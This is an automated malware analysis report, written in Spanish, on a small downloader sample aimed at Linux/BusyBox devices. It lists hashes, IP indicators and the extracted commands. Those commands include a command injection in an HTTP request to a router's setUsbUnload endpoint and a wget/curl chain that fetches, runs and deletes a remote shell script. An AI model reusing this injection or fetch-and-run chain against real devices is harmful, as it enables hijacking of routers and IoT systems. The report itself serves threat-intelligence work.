# 🧬 Payload Analysis

`829affd7ae5522f8df50fdbeeabe468d87207bb547c2ac3d357cdccf30d2be58`

## 📌 Resumen

Texto ASCII de 331 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.tenda`
5. `rm -f .s`
6. `cd /tmp`
7. `wget hxxp://91.92.40.XXX/wget.sh -O .s` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/829affd7ae5522f8df50fdbeeabe468d87207bb547c2ac3d357cdccf30d2be58.md](../../../../../malware-like/oraculo/downloader/829affd7ae5522f8df50fdbeeabe468d87207bb547c2ac3d357cdccf30d2be58.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `829affd7ae5522f8df50fdbeeabe468d87207bb547c2ac3d357cdccf30d2be58`
- **SHA1:** `f36baf40521929839647bc8c329d2d2b7e568a6b`
- **MD5:** `5c6e128e7f0acc4527bb5454ca6c3f4e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 331 B |
| Entropía | 5.09 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusy
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.tenda%3Brm%20-f%20.s | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusy | strings |
| hash | 829affd7ae5522f8df50fdbeeabe468d87207bb547c2ac3d357cdccf30d2be58 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
